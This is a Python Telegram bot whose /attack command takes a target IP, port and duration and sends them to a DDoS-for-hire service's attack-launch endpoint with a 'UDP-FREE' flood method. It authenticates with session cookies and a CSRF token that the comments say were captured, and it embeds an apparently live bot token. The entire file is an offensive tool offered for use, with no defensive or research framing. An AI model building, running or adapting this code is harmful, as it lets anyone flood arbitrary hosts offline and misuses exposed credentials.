import requests
import json
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== CONFIG ====================
BOT_TOKEN = "8521144614:AAE-P7L4SKCMk5ZaggzU4jZmhmbMMBUhUJA"
ADMIN_IDS = [7820814565]  # Apna ID

# API Details
BASE_URL = "https://satellitestress.st"
API_LOGIN = f"{BASE_URL}/api/csrf"
API_ATTACK = f"{BASE_URL}/api/attack/launch"

# Tumhari capture ki hui cookies aur CSRF token (UPDATE KAR DIYA)
CSRF_TOKEN = "45aa3281026e28fd110acfef4383e5638134b72e3e1bc695cf2a8d0f9a343926.1772721528.NmJ0cM4C8ltE8iviPU_wsFlw1otzsPlPDfSpSOczkKU"
COOKIES = {
    "__diamwall": "0x1110792600",
    "satellite_auth": "971c225b-8d48-4788-be56-2e5295bda170",
    "satellite_captcha_verified": "HC2.eyJ2IjoxLCJ1aWQiOiJiNjU2OWVjOGVjZjFkM2ZhIiwiaWF0IjoxNzcyNzIwNjgzODM0LCJleHAiOjE3NzI4MDcwODM4MzQsIm5vbmNlIjoiMjg3YTJhYmRlM2RhY2ViYyJ9.NR8z3ft6xCVc3z6ySecuSqea6PBVeEDBvErNTirtyns"
}

# Session create karo
session = requests.Session()
session.cookies.update(COOKIES)
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "Content-Type": "application/json",
    "Origin": BASE_URL,
    "Referer": f"{BASE_URL}/attack",
    "x-csrf-token": CSRF_TOKEN,
    "TE": "trailers"
})

# ==================== ATTACK FUNCTION ====================
def launch_api_attack(ip, port, duration):
    """Direct API attack - fastest method"""
    
    # Payload (Content-Length: 88 ke hisaab se)
    payload = {
        "target": ip,
        "port": int(port),
        "time": int(duration),
        "method": "UDP-FREE"
    }
    
    try:
        response = session.post(API_ATTACK, json=payload, timeout=30)
        
        if response.status_code == 200:
            result = response.json()
            return True, result.get('message', 'Attack launched successfully')
        else:
            return False, f"HTTP {response.status_code}: {response.text[:200]}"
            
    except Exception as e:
        return False, str(e)

# ==================== TELEGRAM COMMANDS ====================
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /attack command"""
    user_id = update.effective_user.id
    
    # Parse arguments
    args = context.args
    if len(args) != 3:
        await update.message.reply_text(
            "❌ **Invalid format!**\n"
            "Use: `/attack <ip> <port> <time>`\n"
            "Example: `/attack 1.1.1.1 80 60`"
        )
        return
    
    ip, port_str, time_str = args
    
    # Validate port
    try:
        port = int(port_str)
        if port < 1 or port > 65535:
            await update.message.reply_text("❌ Port must be between 1-65535")
            return
    except:
        await update.message.reply_text("❌ Invalid port number")
        return
    
    # Validate time
    try:
        duration = int(time_str)
        if duration < 10 or duration > 300:
            await update.message.reply_text("❌ Time must be between 10-300 seconds")
            return
    except:
        await update.message.reply_text("❌ Invalid time")
        return
    
    # Send initial message
    msg = await update.message.reply_text(
        f"🔄 **Launching API attack...**\n"
        f"Target: `{ip}:{port}`\n"
        f"Duration: {duration}s"
    )
    
    # Launch attack
    success, result = launch_api_attack(ip, port, duration)
    
    if success:
        await msg.edit_text(
            f"✅ **ATTACK LAUNCHED SUCCESSFULLY!**\n\n"
            f"Target: `{ip}:{port}`\n"
            f"Duration: {duration}s\n"
            f"Method: UDP-FREE\n\n"
            f"⚡ Attack is now running!"
        )
    else:
        await msg.edit_text(
            f"❌ **ATTACK FAILED**\n\n"
            f"Error: {result}\n\n"
            f"Cookies ya CSRF token expire ho sakta hai."
        )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    await update.message.reply_text(
        "🤖 **API ATTACK BOT**\n\n"
        "Commands:\n"
        "• `/attack <ip> <port> <time>` - Launch attack\n"
        "  Example: `/attack 1.1.1.1 80 60`\n\n"
        "⚡ Fastest method - direct API calls!"
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check API status"""
    try:
        # CSRF endpoint se check karo
        resp = session.get(API_LOGIN)
        if resp.status_code == 200:
            await update.message.reply_text("✅ API is working! Cookies are valid.")
        else:
            await update.message.reply_text(f"❌ API error: {resp.status_code}")
    except Exception as e:
        await update.message.reply_text(f"❌ Connection error: {str(e)}")

# ==================== MAIN ====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    
    print("="*50)
    print("🔥 API ATTACK BOT STARTED")
    print("="*50)
    print(f"🌐 Base URL: {BASE_URL}")
    print(f"🎯 Attack endpoint: {API_ATTACK}")
    print(f"🍪 Cookies loaded: {len(COOKIES)}")
    print(f"🔑 CSRF Token: {CSRF_TOKEN[:30]}...")
    print("="*50)
    print("Commands:")
    print("  /attack ip port time")
    print("  /status")
    print("="*50)
    
    app.run_polling()

if __name__ == "__main__":
    main()
